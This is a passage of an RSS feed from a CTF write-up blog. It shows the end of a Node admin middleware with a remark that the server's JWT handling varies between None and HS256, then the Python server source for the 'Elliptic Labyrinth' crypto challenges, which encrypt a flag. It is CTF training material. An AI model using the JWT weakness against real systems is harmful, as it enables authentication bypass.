&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">redirect&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"/login"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">next&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk1">};&lt;/span>

&lt;span class="mtk1">module&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">exports&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">AdminMiddleware&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>The server is using JSON Web Token (JWT) as authentication method. However, it behaves differently depending on the signing method (it varies between &lt;code>None&lt;/code> and &lt;code>HS256&lt;/code>).&lt;/p></description></item><item><title>Elliptic Labyrinth</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth/</guid><description>&lt;p>We are provided with the server source code in Python:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8 mtku">json&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">hashlib&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sha256&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">random&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">randint&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">number&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">getPrime&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Padding&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pad&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> sage.all_cmdline &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> secret &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">FLAG&lt;/span>


&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">ECC&lt;/span>&lt;span class="mtk1">:&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">bits&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">getPrime&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">bits&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">a&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">randint&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">randint&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">gen_random_point&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> EllipticCurve(GF(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">), [&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1">]).random_point()&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"1. Get parameters of path"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"2. Get point in path"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"3. Try to exit the labyrinth"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"&amp;gt; "&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">ECC&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">512&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">while&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">True&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'1'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">randint&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">bit_length&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">bit_length&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">json&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">dumps&lt;/span>&lt;span class="mtk1">({&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'p'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">),&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'a'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">a&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1">),&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'b'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> }))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'2'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">A&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">gen_random_point&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8 mtku">json&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">dumps&lt;/span>&lt;span class="mtk1">({&lt;/span>&lt;span class="mtk4">'x'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">A&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">]), &lt;/span>&lt;span class="mtk4">'y'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">A&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">])}))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'3'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">iv&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">urandom&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sha256&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">))).&lt;/span>&lt;span class="mtk8">digest&lt;/span>&lt;span class="mtk1">()[:&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">]&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">new&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">MODE_CBC&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">iv&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">flag&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pad&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">FLAG&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">json&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">dumps&lt;/span>&lt;span class="mtk1">({&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'iv'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk1">iv&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(),&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'enc'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">flag&lt;/span>&lt;span class="mtk1">).&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> }))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Bye.'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">()&lt;/span>


&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'__main__'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>The server uses Elliptic Curve Cryptography (ECC), but it only generates a curve and uses the curve parameters to generate an AES key to encrypt the flag (so ECC is not actually used for encryption).&lt;/p></description></item><item><title>Elliptic Labyrinth Revenge</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth-revenge/</guid><description>&lt;p>This challenge is &lt;a target="_blank" href="../elliptic-labyrinth">Elliptic Labyrinth&lt;/a> modified to force CTF players use the intended way to solve the challenge.&lt;/p>
&lt;h2 id="finding-differences">Finding differences&lt;/h2>
&lt;p>The provided source code is a bit different:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8 mtku">json&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">hashlib&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sha256&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">random&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">randint&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">number&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">getPrime&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Padding&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pad&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> sage.all_cmdline &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> secret &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">FLAG&lt;/span>


&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">ECC&lt;/span>&lt;span class="mtk1">:&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">bits&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">getPrime&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">bits&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">a&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">randint&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">randint&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">gen_random_point&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> EllipticCurve(GF(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">), [&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1">]).random_point()&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"1. Get parameters of path"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"2. Try to exit the labyrinth"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"&amp;gt; "&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">ECC&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">512&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">A&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">gen_random_point&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"This is the point you calculated before:"&lt;/span>&lt;span class="mtk1">)&lt;/span>
